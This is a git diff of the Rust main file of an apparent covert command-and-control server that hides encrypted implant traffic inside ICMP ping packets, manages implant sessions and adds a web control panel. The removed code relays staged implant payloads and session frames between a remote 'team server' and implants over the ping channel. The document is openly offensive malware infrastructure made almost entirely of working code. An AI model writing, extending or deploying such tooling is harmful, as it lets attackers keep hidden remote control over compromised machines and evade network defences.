@@ -1,76 +1,88 @@
+#![deny(clippy::all, clippy::pedantic)]
 #![feature(slice_range)]
 #![feature(never_type)]
+mod environment;
 mod nft;
-
-mod worker;
+mod patcher;
+mod workers;
 use anyhow::{bail, Result};
-
-use crate::nft::NftRules;
 use clap::Parser;
-use covert_c2_ping_common::{Arch, PingMessage};
+use covert_c2_ping_common::{PingMessage, SessionData};
 use covert_common::CovertChannel;
-use covert_server::{CSFrameRead, CSFrameWrite};
 use lazy_static::lazy_static;
-use std::{collections::HashMap, sync::Arc, time::Duration};
+use nft::Rules;
+use rand::Rng;
+use std::{
+    collections::HashMap,
+    time::{Duration, SystemTime, UNIX_EPOCH},
+};
 use tokio::{
     select,
     signal::{self, unix::SignalKind},
-    sync::{mpsc, Mutex},
+    sync::{
+        mpsc::{self, UnboundedSender},
+        Mutex,
+    },
     task,
 };
 use tracing::{Instrument, Level};
-use worker::PingTransaction;
+use workers::{ping, web};
 
 #[derive(Parser)]
 #[clap(author, version, about, long_about = None)]
 struct Config {
-    #[clap(long, value_parser,default_value_t=String::from("localhost"))]
+    #[clap(long, value_parser, default_value_t=std::env::var("TEAM_SERVER").unwrap_or("localhost:2222".to_owned()))]
     ts: String,
-    #[clap(name="interface", long="i", value_parser,default_value_t=String::from("eth0"))]
+    #[clap(name="interface", long="i", value_parser, default_value_t=String::from("eth0"))]
     i: String,
-    #[clap(long, value_parser)]
-    key: String,
 }
 
 lazy_static! {
     static ref GLOBAL_CONF: Config = Config::parse();
     static ref KEY: [u8; 32] = {
-        let key_string = *(&(*GLOBAL_CONF).key.as_bytes());
-        let truncated = if key_string.len() > 32 {
-            &key_string[..32]
-        } else {
-            key_string
-        };
-        let mut key_vec = truncated.to_vec();
-        if key_vec.len() < 32 {
-            key_vec.append(&mut vec![0u8; 32 - key_vec.len()]);
-        }
-        return key_vec.try_into().expect("Could not make array");
+        let mut key = [0u8; 32];
+        rand::thread_rng().fill(&mut key);
+        key
     };
+    static ref CHANNEL: Mutex<CovertChannel<PingMessage, 4>> =
+        Mutex::new(CovertChannel::<PingMessage, 4>::new(*KEY));
+    static ref SESSIONS: Mutex<HashMap<u16, (UnboundedSender<()>, SessionData)>> =
+        Mutex::new(HashMap::new());
 }
 
-fn main() {
+fn main() -> Result<()> {
     let rt = tokio::runtime::Builder::new_multi_thread()
         .enable_all()
-        .build()
-        .unwrap();
-    rt.block_on(entry()).unwrap();
+        .build()?;
+    rt.block_on(entry())?;
     rt.shutdown_timeout(Duration::from_secs(1));
-    tracing::info!("Shutdown complete")
+    tracing::info!("Shutdown complete");
+    Ok(())
 }
 
 async fn entry() -> Result<()> {
     let conf = &(*GLOBAL_CONF);
     tracing_subscriber::fmt::init();
-
+    tracing::info!("Control Panel on port 8080");
+    tracing::info!(
+        "Static Web Files: {:?}",
+        environment::get_static_path().as_os_str()
+    );
+    tracing::info!(
+        "Artifact Files: {:?}",
+        environment::get_artifact_path().as_os_str()
+    );
     tracing::info!("Team Server: {}", conf.ts);
     tracing::info!("Interface: {}", conf.i);
     tracing::info!("Key: {:02X?}", *KEY);
     tracing::info!("Starting...");
-    let rules = NftRules::new().or_else(|err| {
+
+    let web_h = task::spawn(web::worker());
+    let rules = Rules::new().or_else(|err| {
         tracing::info!("{:?}", err);
         bail!("Failed to make rules");
     })?;
+
     let sig_h = task::spawn(
         async move {
             let mut res =
@@ -80,17 +92,18 @@ async fn entry() -> Result<()> {
         }
         .instrument(tracing::span!(Level::INFO, "signal_handle")),
     );
-    let (downstream_sender, upstream_receiver, recv_h, send_h) = worker::start_workers()?;
+
+    let (downstream_sender, upstream_receiver, recv_h, send_h) = ping::start_workers()?;
 
     let main_h = task::spawn(main_loop(downstream_sender, upstream_receiver));
 
     select! {
+        _ = web_h => {}
         _ = recv_h => {}
         _ = send_h => {}
         _ = sig_h => {}
         _ = main_h => {}
     }
-
     drop(rules);
     tracing::info!("Shutting down");
     Ok(())
@@ -98,66 +111,63 @@ async fn entry() -> Result<()> {
 
 #[tracing::instrument(skip_all)]
 async fn main_loop(
-    downstream_sender: mpsc::UnboundedSender<PingTransaction>,
-    mut upstream_reciever: mpsc::UnboundedReceiver<PingTransaction>,
+    downstream_sender: mpsc::UnboundedSender<ping::Transaction>,
+    mut upstream_receiver: mpsc::UnboundedReceiver<ping::Transaction>,
 ) -> Result<()> {
-    let channel = Arc::new(Mutex::new(
-        covert_common::CovertChannel::<PingMessage, 4>::new(*KEY),
-    ));
-    let sessions = Arc::new(Mutex::new(
-        HashMap::<u16, mpsc::UnboundedSender<PingMessage>>::new(),
-    ));
     loop {
         tracing::info!("Waiting for message");
-        let incoming_ping = match upstream_reciever.recv().await {
-            Some(ping) => ping,
-            None => {
-                tracing::info!("Upstream worker closed");
-                break;
-            }
+        let incoming_ping = if let Some(ping) = upstream_receiver.recv().await {
+            ping
+        } else {
+            tracing::info!("Upstream worker closed");
+            break;
         };
-        let channel_state = channel.lock().await.put_packet(&incoming_ping.data);
+        let channel_state = CHANNEL.lock().await.put_packet(&incoming_ping.data);
         let out_data: Vec<u8> = match channel_state {
             Ok((inc_chan, has_message)) => {
-                if has_message {
-                    let res = channel.lock().await.get_message(inc_chan);
-                    match res {
-                        Some(in_message) => {
-                            handle_message(in_message, inc_chan, sessions.clone(), channel.clone())
-                                .await;
-                        }
-                        None => {
-                            tracing::info!("No message in channel");
-                        }
-                    };
+                let mut session_guard = SESSIONS.lock().await;
+                let session = session_guard.get_mut(&inc_chan);
+                if let Some((notify, session_data)) = session {
+                    session_data.last_checkin = SystemTime::now()
+                        .duration_since(UNIX_EPOCH)
+                        .ok()
+                        .map(|v| v.as_secs_f64() * 1_000.0_f64);
+                    session_data.host = Some(incoming_ping.src_ip);
+                    if has_message && notify.send(()).is_err() {
+                        tracing::info!(channel = inc_chan, "channel closed");
+                        session_guard.remove(&inc_chan);
+                    }
+                } else {
+                    tracing::info!(channel = inc_chan, "not a valid channel");
                 }
-                let (in_num, out_num) = channel.lock().await.packets_in_queue(inc_chan);
+                drop(session_guard);
+
+                let (in_num, out_num) = CHANNEL.lock().await.packets_in_queue(inc_chan);
                 tracing::info!(
                     inbound_packets = in_num,
                     outbound_packets = out_num,
                     channel = inc_chan,
                     "channel status"
                 );
-                channel.lock().await.get_packet(inc_chan)
+                CHANNEL.lock().await.get_packet(inc_chan)
             }
             Err(e) => {
                 match e {
                     covert_common::CovertError::DecryptionError => {
-                        tracing::info!("Failed to decrypt packet")
+                        tracing::info!("Failed to decrypt packet");
                     }
                     covert_common::CovertError::InvalidHash => {
-                        tracing::info!("Invalid hash in packet")
+                        tracing::info!("Invalid hash in packet");
                     }
                     covert_common::CovertError::DeserializeError => {
-                        tracing::info!("Failed to deserialize packets to message")
+                        tracing::info!("Failed to deserialize packets to message");
                     }
                 }
-
                 continue;
             }
         };
 
-        let outgoing_ping = PingTransaction {
+        let outgoing_ping = ping::Transaction {
             src_mac: incoming_ping.dst_mac,
             dst_mac: incoming_ping.src_mac,
             src_ip: incoming_ping.dst_ip,
@@ -172,92 +182,4 @@ async fn main_loop(
         };
     }
     Ok(())
-}
-
-pub async fn handle_message(
-    message: PingMessage,
-    stream: u16,
-    sessions: Arc<Mutex<HashMap<u16, mpsc::UnboundedSender<PingMessage>>>>,
-    channel: Arc<Mutex<CovertChannel<PingMessage, 4>>>,
-) {
-    if let PingMessage::InitMessage(arch, pipename) = message {
-        let (sender, mut receiver) = mpsc::unbounded_channel::<PingMessage>();
-
-        task::spawn(async move {
-            let arch = match arch {
-                Arch::i686 => "x86",
-                Arch::X86_64 => "x64",
-            };
-            let connection = match covert_server::start_implant_session(
-                &GLOBAL_CONF.ts,
-                arch,
-                &pipename,
-            )
-            .await
-            {
-                Ok((payload, connection)) => {
-                    channel
-                        .lock()
-                        .await
-                        .put_message(PingMessage::DataMessage(payload), stream);
-                    connection
-                }
-                Err(_) => {
-                    tracing::info!("Failed to connect to team server");
-                    channel
-                        .lock()
-                        .await
-                        .put_message(PingMessage::CloseMessage, stream);
-                    return;
-                }
-            };
-            sessions.lock().await.insert(stream, sender);
-            let (mut read_tcp, mut write_tcp) = connection.into_split();
-            let ts_reader = task::spawn(async move {
-                loop {
-                    match read_tcp.read_frame().await {
-                        Ok(data) => channel
-                            .lock()
-                            .await
-                            .put_message(PingMessage::DataMessage(data), stream),
-                        Err(_) => {
-                            tracing::info!("Session closed with TS");
-                            break;
-                        }
-                    };
-                }
-            });
-            let ts_writer = task::spawn(async move {
-                loop {
-                    match receiver.recv().await {
-                        Some(PingMessage::DataMessage(data)) => {
-                            if let Err(_) = write_tcp.write_frame(&data).await {
-                                tracing::info!("Session closed with TS");
-                                break;
-                            };
-                        }
-                        Some(_) => {
-                            tracing::info!("Invalid message received")
-                        }
-                        None => {
-                            tracing::info!("Session closed with downstream");
-                            break;
-                        }
-                    };
-                }
-            });
-            select! {
-                _ = ts_reader => {}
-                _ = ts_writer => {}
-            };
-            sessions.lock().await.remove(&stream);
-        });
-    } else {
-        let mut sessions_guard = sessions.lock().await;
-        if let Some(sender) = sessions_guard.get(&stream) {
-            if let Err(_) = sender.send(message) {
-                sessions_guard.remove(&stream);
-            };
-        }
-    }
 }
